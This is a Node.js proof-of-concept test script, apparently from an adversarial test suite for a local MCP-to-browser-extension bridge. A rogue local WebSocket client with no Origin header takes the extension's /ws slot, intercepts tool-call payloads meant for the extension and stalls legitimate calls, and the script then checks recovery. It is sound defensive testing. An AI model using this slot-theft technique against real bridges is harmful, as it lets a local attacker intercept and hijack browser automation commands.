// adv-17-slottheft.mjs — demonstrate that a rogue local WS client stealing the
// /ws slot (allowed: origin=none, "trusted-localhost" model) (a) RECEIVES real
// tools/call payloads destined for the extension, and (b) makes those calls
// hang until MCP_CALL_TIMEOUT because pending is only flushed on the LIVE
// socket's close... and the rogue socket IS the live one.
// Run: node adv-17-slottheft.mjs

import { McpSession, health, sleep, brief, initWithRetry, startServer, waitForExtension } from './adv-17-lib.mjs';

const srv = await startServer();
const U = 'http://127.0.0.1:' + srv.port + '/p';

const s = new McpSession('thief-test');
await initWithRetry(s);
await waitForExtension();
let pg = null;
for (let i = 0; i < 10 && !pg; i++) {
  const r = await s.call('new_page', { url: U, background: true });
  pg = r.sc && r.sc.pageId;
  if (!pg) { console.log('new_page attempt', i, brief(r)); await sleep(1500); }
}
if (!pg) { console.log('could not open page'); process.exit(1); }
console.log('page:', pg, '| health:', JSON.stringify(await health()));

// Rogue local WS client — no Origin header -> treated as trusted-localhost.
const ws = new WebSocket('ws://127.0.0.1:7890/ws');
const captured = [];
ws.onmessage = ev => {
  const m = JSON.parse(ev.data);
  if (m.type === 'call') captured.push(m);
};
await new Promise(r => { ws.onopen = r; });
console.log('rogue WS connected — now holding extSocket slot');
await sleep(300);
console.log('health while rogue holds slot:', JSON.stringify(await health()));

// Now a legit MCP call — it should go to the extension, but the bridge sends
// it to MY rogue socket instead.
const t0 = Date.now();
const callP = s.call('evaluate_script', { pageId: pg, function: `() => 'should-reach-extension'` }, { timeout: 20000 });
await sleep(1500);
console.log('calls captured on rogue socket:', captured.length, captured.map(c => c.tool));
// release: closing the rogue socket flushes pending -> caller gets error
ws.close();
const r = await callP;
console.log(`call resolved after ${Date.now() - t0}ms:`, brief(r));

// Extension should reconnect after our close — wait and verify recovery.
let recovered = false;
for (let i = 0; i < 30; i++) {
  const h = await health();
  if (h.extensionConnected) {
    const probe = await s.call('list_pages', {}, { timeout: 15000 });
    if (probe.ok) { recovered = true; break; }
  }
  await sleep(1000);
}
console.log('extension recovered:', recovered);

await s.call('close_page', { pageId: pg }).catch(() => {});
await s.close();
srv.close();
console.log('done');
